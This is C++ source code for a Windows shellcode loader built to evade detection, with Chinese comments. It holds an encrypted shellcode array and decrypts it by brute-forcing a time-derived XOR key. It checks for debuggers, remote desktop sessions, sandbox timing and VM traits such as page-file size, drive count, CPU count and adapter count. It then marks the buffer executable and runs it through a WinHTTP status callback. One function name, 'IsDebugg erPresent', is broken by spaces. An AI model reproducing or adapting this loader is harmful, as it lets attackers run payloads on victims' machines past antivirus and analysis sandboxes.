#include <iostream>
#include <Winsock2.h>
#include <iphlpapi.h>
#include<Windows.h>
#include <chrono>
#include <thread>
#include<winhttp.h>
#pragma comment(lib,"Winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")
using namespace std;

//加密后的shellcode
unsigned char lpAddress[] = "\x72...";

unsigned char* decrypt(unsigned char* input, int len, unsigned int key) {
    unsigned char* output = new unsigned char[len];
    srand(key);
    for (int i = 0; i < len; i++) {
        output[i] = input[i] ^ (rand() % len + 1);
        output[i] = output[i] ^ key;
    }
    return output;
}

bool detect_sandbox() {
    bool is_sandbox = false;
    auto start_time = chrono::high_resolution_clock::now();

    this_thread::sleep_for(chrono::milliseconds(100));

    auto end_time = chrono::high_resolution_clock::now();
    auto elapsed_time = chrono::duration_cast<chrono::milliseconds>(end_time - start_time);

    cout << elapsed_time.count() << endl;
    if (elapsed_time.count() < 100) {
        is_sandbox = true;
    }

    return is_sandbox;
}

int GetNumPages() {
    // 获取系统页面文件大小信息
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    if (!GlobalMemoryStatusEx(&statex)) {
        cerr << "Failed to get system memory status." << endl;
        return 1;
    }

    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    return statex.ullTotalPageFile / systemInfo.dwPageSize;
}

int GetNumDrives() {
    DWORD drives = GetLogicalDrives();
    int numDrives = 0;
    for (char i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            char path[4];
            sprintf_s(path, "%c:\\", 'A' + i);
            UINT type = GetDriveTypeA(path);
            if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) {
                numDrives++;
            }
        }
    }
    return numDrives;
}

int GetNumAdapters() {
    DWORD dwSize = 0;
    GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &dwSize);
    PIP_ADAPTER_ADDRESSES pAddresses = (PIP_ADAPTER_ADDRESSES)new BYTE[dwSize];
    GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &dwSize);
    int numAdapters = 0;
    PIP_ADAPTER_ADDRESSES pCurrAddresses = pAddresses;
    while (pCurrAddresses) {
        if (pCurrAddresses->OperStatus == IfOperStatusUp) {
            numAdapters++;
        }
        pCurrAddresses = pCurrAddresses->Next;
    }
    return numAdapters;
}

int main() {
    if (IsDebugg           erPresent()) {
        cout << "调试器检测到当前程序" << endl;
        return 1;
    }

    BOOL bDebuggerPresent = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebuggerPresent) && bDebuggerPresent) {
        cout << "远程调试器检测到当前程序" << endl;
        return 1;
    }

    if (GetSystemMetrics(SM_REMOTESESSION) != 0) {
        cout << "当前程序正在远程桌面会话中" << endl;
        return 1;
    }

    if (detect_sandbox()) {
        cout << "This program may be running in a sandbox!" << endl;
        return 1;
    }

    int numPages = GetNumPages();
    cout << numPages << endl;
    if (numPages < 4000000) {
        cout << "The memory page is smaller than normal and may be in a virtual machine environment" << endl;
        return 1;
    }

    int numDrives = GetNumDrives();
    cout << numDrives << endl;
    if (numDrives < 2) {
        cout << "The number of hard disks is smaller than normal, and the hard disks may be in a VM environment" << endl;
        return 1;
    }

    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    cout << systemInfo.dwNumberOfProcessors << endl;
    if (systemInfo.dwNumberOfProcessors <= 4) {
        cout << "If the number of cpus is smaller than normal, the system may be running on a VM" << endl;
        return 1;
    }

    int numAdapters = GetNumAdapters();
    cout << numAdapters << endl;
    if (numAdapters < 2) {
        cout << "The number of network adapters is smaller than normal, and the network adapter may be in a VM environment" << endl;
        return 1;
    }

    int i = 500;
    while (i--) {
        // 获取开始时间
        auto start_time = chrono::high_resolution_clock::now();
        // 延迟100毫秒
        this_thread::sleep_for(chrono::milliseconds(100));
        // 获取结束时间
        auto end_time = chrono::high_resolution_clock::now();
        // 计算时间差
        auto elapsed_time = chrono::duration_cast<chrono::milliseconds>(end_time - start_time);
        srand(time(NULL));
        // 密钥454545先减去100毫秒，再减去15得454430，再加上时间差和0-30的随机数碰撞出原key
        unsigned char* decrypted = decrypt(lpAddress, sizeof lpAddress - 1, 454430 + elapsed_time.count() + (rand() % 30));
        if (decrypted[0] == 0xfc and decrypted[1] == 0x48) {
            DWORD lpflOldProtect;
            VirtualProtect(decrypted, sizeof lpAddress - 1, PAGE_EXECUTE_READWRITE, &lpflOldProtect);
            HINTERNET hSession = WinHttpOpen(L"User Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            WINHTTP_STATUS_CALLBACK callback = WinHttpSetStatusCallback(hSession, (WINHTTP_STATUS_CALLBACK)decrypted, WINHTTP_CALLBACK_FLAG_HANDLES, 0);
            WinHttpCloseHandle(hSession);
            break;
        }
    }
    return 0;
}
